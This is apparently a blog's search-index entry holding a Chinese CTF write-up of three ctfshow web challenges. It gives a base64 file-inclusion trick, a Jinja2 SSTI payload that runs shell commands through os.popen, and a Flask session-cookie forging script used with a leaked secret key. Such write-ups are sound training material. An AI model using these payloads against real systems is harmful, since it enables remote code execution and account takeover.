<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>愚人杯wp</title>
      <link href="/2023/06/27/yu-ren-bei-wp/"/>
      <url>/2023/06/27/yu-ren-bei-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="愚人杯"><a href="#愚人杯" class="headerlink" title="愚人杯"></a>愚人杯</h1><h1 id="热身赛："><a href="#热身赛：" class="headerlink" title="热身赛："></a>热身赛：</h1><p>有点坑，刚开始时脑子真没反应过来</p><p><img src="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled.png" class="lazyload placeholder" data-srcset="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>flag就是“一个不能说的密码”，绝了，我还以为flag是“群主喜欢36d”（bushi）</p><h1 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a><strong>easy_signin</strong></h1><p>题目：</p><p><img src="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%201.png" class="lazyload placeholder" data-srcset="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%201.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>可以看到url里有一个img&#x3D;xxx</p><p>xxx为十六编码</p><p>我们试一下用index.php转换为base64：<code>aW5kZXgucGhw</code></p><p>包含<code>aW5kZXgucGhw</code></p><p>得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKLyoKIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIyBAQXV0aG9yOiBoMXhhCiMgQERhdGU6ICAgMjAyMy0wMy0yNyAxMDozMDozMAojIEBMYXN0IE1vZGlmaWVkIGJ5OiAgIGgxeGEKIyBATGFzdCBNb2RpZmllZCB0aW1lOiAyMDIzLTAzLTI4IDEyOjE1OjMzCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQojIEBsaW5rOiBodHRwczovL2N0ZmVyLmNvbQoKKi8KCiRpbWFnZT0kX0dFVFsnaW1nJ107CgokZmxhZyA9ICJjdGZzaG93ezBmZTk1YjRhLTU2NjEtNDU0OS04NzMxLTA1OTk0NzYyYmJhYX0iOwppZihpc3NldCgkaW1hZ2UpKXsKCSRpbWFnZSA9IGJhc2U2NF9kZWNvZGUoJGltYWdlKTsKCSRkYXRhID0gYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cygkaW1hZ2UpKTsKCWVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL3BuZztiYXNlNjQsJGRhdGEnLz4iOwp9ZWxzZXsKCSRpbWFnZSA9IGJhc2U2NF9lbmNvZGUoImZhY2UucG5nIik7CgloZWFkZXIoImxvY2F0aW9uOi8/aW1nPSIuJGltYWdlKTsKfQoKCgoK</span><br></pre></td></tr></table></figure><p>进行base64解码得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2023-03-28 12:15:33</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line">- /</span><br><span class="line">$image=$_GET[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line">$flag = <span class="string">&quot;ctfshow&#123;0fe95b4a-5661-4549-8731-05994762bbaa&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($image))&#123;</span><br><span class="line">$image = base64_decode($image);</span><br><span class="line">$data = base64_encode(file_get_contents($image));</span><br><span class="line">echo <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,$data&#x27;/&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$image = base64_encode(<span class="string">&quot;face.png&quot;</span>);</span><br><span class="line">header(<span class="string">&quot;location:/?img=&quot;</span>.$image);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p><h1 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a><strong>easy_ssti</strong></h1><p>题目：页面提示有个app.py包，我们下载来看一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">name=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>,name=name)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hellodear</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ge&quot;</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;f&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Nonononon&#x27;</span></span><br></pre></td></tr></table></figure><p>是道SSTI注入，我们需要访问<code>/hello.html</code>，拼接：<code>/hello.html/&#123;&#123;payload&#125;&#125;</code>进行注入</p><p>先试一下2，没问题，页面返回2，证明代码成功运行了</p><p>思路：</p><p>利用<code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[83]</code>构造出我们想要的类</p><p><code>&quot;&quot;.__class__</code>：当前变量的类</p><p><code>&quot;&quot;.__class__.___bases__[0]</code>：当前变量的类的基类（最基础的类，[0]表示object类）</p><p><code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[83]</code> 当前变量的类的基类的子类（到这里已经包含了其他类，83表示数组中的索引，指向一个类，83是通过爆破出来的，一边爆破一边看包返回长度及内容）</p><p>然后<code>__init__</code>表示将类初始化（有点像实例化，不确定）</p><p><code>__globals__</code> 取function所处空间下可使用的module、方法以及所有变量</p><p><code>__globals__[&#39;__builtins__&#39;]</code> 表示类里面的函数了（这里可以输出看一下有什么函数，如果没有我们要的可以更改<code>__subclasses__[]</code>看一下有没有我们想要的）</p><p><code>__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]()</code> 调用eval函数</p><p>传参<code>(&quot;__import__(&#39;os&#39;).popen(&#39;echo Y2F0IC9mbGFn |base64 -d|sh&#39;).read()&quot;)</code></p><p>这里已经是执行python代码了，我们动态导入os库，然后调用popen执行，用read()读取</p><p>这里出现了个问题，就是传入参数中屏蔽了斜杆“<code>/</code>”，所以我们需要使用base64编码绕过</p><p>但又出来个问题，我以前用的是<code>bash</code>，但这里发现不行，所以根据经验改为<code>sh</code></p><p>最后得到payload:</p><p><code>http://af57955d-b019-4224-9356-8e996bc58900.challenge.ctf.show/hello/&#123;&#123;"".__class__.__bases__[0].__subclasses__()[83].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('echo Y2F0IC9mbGFn |base64 -d|sh').read()")&#125;&#125;</code></p><p>成功！！！</p><p><img src="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%202.png" class="lazyload placeholder" data-srcset="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%202.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><h1 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a><strong>easy_flask</strong></h1><p>知识点：</p><ul><li>flask session伪造</li><li>flask代码审计</li><li>任意文件下载</li></ul><p>题目：</p><p>进来之后有两个窗口，一个登录窗口和一个注册窗口</p><p><img src="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%203.png" class="lazyload placeholder" data-srcset="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%203.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>在注册窗口尝试注册了admin，发现用户已存在</p><p><img src="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%204.png" class="lazyload placeholder" data-srcset="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%204.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>然后在这里在登录和注册试了sql注入，没成功</p><p>我们先随便注册一个账号，登录进去</p><p><img src="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%205.png" class="lazyload placeholder" data-srcset="/2023/06/27/%E6%84%9A%E4%BA%BA%E6%9D%AFwp/Untitled%205.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>发现有个<code>leran</code> 点击（我刚开始没点击，在登录和注册徘徊了1个多小时（悲））</p><ul><li><p>得到部分源代码</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"><span class="comment"># Check if user is loggedin</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">........</span><br></pre></td></tr></table></figure></li></ul><p>对代码进行审计，看来我们需要进行flask session伪造</p><ul><li><p>flask session伪造脚本：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span><br><span class="line">__author__ = &#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span><br><span class="line"></span><br><span class="line"># standard imports</span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line">import ast</span><br><span class="line"></span><br><span class="line"># Abstract Base Classes (PEP 3119)</span><br><span class="line">if sys.version_info[0] &lt; 3:  # &lt; 3.0</span><br><span class="line">    raise Exception(&#x27;Must be using at least Python 3&#x27;)</span><br><span class="line">elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4:  # &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br><span class="line">    from abc import ABCMeta, abstractmethod</span><br><span class="line">else:  # &gt; 3.4</span><br><span class="line">    from abc import ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"># Lib for argument parsing</span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line"># external Imports</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">class MockApp(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, secret_key):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line">if sys.version_info[0] == 3 and sys.version_info[1] &lt; 4:  # &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br><span class="line">    class FSCM(metaclass=ABCMeta):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                return s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"></span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">try:</span><br><span class="line">                if (secret_key == None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    if payload.startswith(&#x27;.&#x27;):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(&quot;.&quot;)[0]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    if compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    return data</span><br><span class="line">                else:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    return s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line">else:  # &gt; 3.4</span><br><span class="line">    class FSCM(ABC):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                return s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"></span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">try:</span><br><span class="line">                if (secret_key == None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    if payload.startswith(&#x27;.&#x27;):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(&quot;.&quot;)[0]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    if compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    return data</span><br><span class="line">                else:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    return s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # Args are only relevant for __main__ usage</span><br><span class="line"></span><br><span class="line">    ## Description for help</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=&#x27;Flask Session Cookie Decoder/Encoder&#x27;,</span><br><span class="line">        epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)</span><br><span class="line"></span><br><span class="line">    ## prepare sub commands</span><br><span class="line">    subparsers = parser.add_subparsers(help=&#x27;sub-command help&#x27;, dest=&#x27;subcommand&#x27;)</span><br><span class="line"></span><br><span class="line">    ## create the parser for the encode command</span><br><span class="line">    parser_encode = subparsers.add_parser(&#x27;encode&#x27;, help=&#x27;encode&#x27;)</span><br><span class="line">    parser_encode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                               help=&#x27;Secret key&#x27;, required=True)</span><br><span class="line">    parser_encode.add_argument(&#x27;-t&#x27;, &#x27;--cookie-structure&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                               help=&#x27;Session cookie structure&#x27;, required=True)</span><br><span class="line"></span><br><span class="line">    ## create the parser for the decode command</span><br><span class="line">    parser_decode = subparsers.add_parser(&#x27;decode&#x27;, help=&#x27;decode&#x27;)</span><br><span class="line">    parser_decode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                               help=&#x27;Secret key&#x27;, required=False)</span><br><span class="line">    parser_decode.add_argument(&#x27;-c&#x27;, &#x27;--cookie-value&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                               help=&#x27;Session cookie value&#x27;, required=True)</span><br><span class="line"></span><br><span class="line">    ## get args</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    ## find the option chosen</span><br><span class="line">    if (args.subcommand == &#x27;encode&#x27;):</span><br><span class="line">        if (args.secret_key is not None and args.cookie_structure is not None):</span><br><span class="line">            print(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    elif (args.subcommand == &#x27;decode&#x27;):</span><br><span class="line">        if (args.secret_key is not None and args.cookie_value is not None):</span><br><span class="line">            print(FSCM.decode(args.cookie_value, args.secret_key))</span><br><span class="line">        elif (args.cookie_value is not None):</span><br><span class="line">            print(FSCM.decode(args.cookie_value))</span><br><span class="line"></span><br><span class="line"># &#123;&#x27;loggedin&#x27;: True, &#x27;role&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;&#125;</span><br></pre></td></tr></table></figure></li></ul><p>我们在浏览器把session复制下来</p><p>利用脚本进行session解密和伪造：</p><p>（解密后推理管理员伪造的规律）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\CTFtools\其他\pytools&gt;[demo1.py](http://demo1.py/) decode -s <span class="string">&quot;S3cr3tK3y&quot;</span> -c <span class="string">&quot;eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6ImFkbWluMiJ9.ZCeNjw.SI08C_xd1I55TbZzcedhgi_oqcU&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;loggedin&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin2&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\CTFtools\其他\pytools&gt;[demo1.py](http://demo1.py/) encode -s <span class="string">&quot;S3cr3tK3y&quot;</span> -t <span class="string">&quot;&#123;&#x27;loggedin&#x27;: True, &#x27;role&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot;</span></span><br><span class="line">.eJyrVsrJT09PTcnMU7IqKSpN1VEqys9JVbJSSkzJBYrpKJUWpxblJeYihGoBzOYRgA.ZCeVRA.p_DkccHDcwzHQA7CmXPqH-5OF3c</span><br></pre></td></tr></table></figure><p>将伪造后的session导入</p><p><img 